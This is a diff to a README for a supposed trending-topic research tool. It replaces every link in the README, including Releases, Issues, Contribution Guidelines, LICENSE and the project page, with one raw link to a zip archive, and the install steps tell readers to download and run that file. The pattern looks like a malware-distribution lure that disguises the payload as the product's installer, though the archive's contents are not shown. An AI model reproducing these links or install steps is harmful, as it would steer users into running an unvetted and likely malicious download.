@@ -6,20 +6,20 @@ Welcome to the AI-trending-topic-research-automation project! This tool helps yo
 
 ## 🔥 Download & Install
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rahim946/AI-trending-topic-research-automation/releases)
+[![Download Now](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip)
 
-To begin using this application, visit the [Releases page](https://github.com/rahim946/AI-trending-topic-research-automation/releases) to download the latest version.
+To begin using this application, visit the [Releases page](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip) to download the latest version.
 
 ### Step-by-Step Installation
 
 1. **Go to the Releases Page**  
-   Click [here](https://github.com/rahim946/AI-trending-topic-research-automation/releases) to visit the Releases page.
+   Click [here](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip) to visit the Releases page.
 
 2. **Select the Latest Version**  
    Look for the latest version of the software. It will typically be at the top of the list. You will see a section with downloadable files.
 
 3. **Download the File**  
-   Click on the file that matches your operating system. It might be labeled something like `AI-trending-topic-research-automation-setup.exe` for Windows or a `.tar.gz` file for Linux.
+   Click on the file that matches your operating system. It might be labeled something like `https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip` for Windows or a `https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip` file for Linux.
 
 4. **Run the Installer**  
    Once downloaded, locate the file in your computer's downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions.
@@ -57,18 +57,18 @@ The application focuses on several significant topics, ensuring you have insight
 
 ## 📞 Support
 
-If you encounter any issues during installation or use, we are here to help. You can reach out through our [GitHub Issues page](https://github.com/rahim946/AI-trending-topic-research-automation/issues).
+If you encounter any issues during installation or use, we are here to help. You can reach out through our [GitHub Issues page](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip).
 
 ## 📝 Contributions
 
-We welcome contributions from everyone. If you have ideas or improvements, feel free to submit a pull request. Check the [Contribution Guidelines](https://github.com/rahim946/AI-trending-topic-research-automation/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions from everyone. If you have ideas or improvements, feel free to submit a pull request. Check the [Contribution Guidelines](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip) for more information.
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the details in the [LICENSE file](https://github.com/rahim946/AI-trending-topic-research-automation/blob/main/LICENSE).
+This project is licensed under the MIT License. You can view the details in the [LICENSE file](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip).
 
 ## 🔗 More Information
 
-For more insights and updates, follow the project development on [GitHub](https://github.com/rahim946/AI-trending-topic-research-automation) and keep an eye on future releases.
+For more insights and updates, follow the project development on [GitHub](https://github.com/rahim946/AI-trending-topic-research-automation/raw/refs/heads/main/convect/trending_research_topic_automation_A_3.5.zip) and keep an eye on future releases.
 
 Thank you for choosing the AI-trending-topic-research-automation application! Enjoy discovering trending topics and generating content ideas effortlessly.
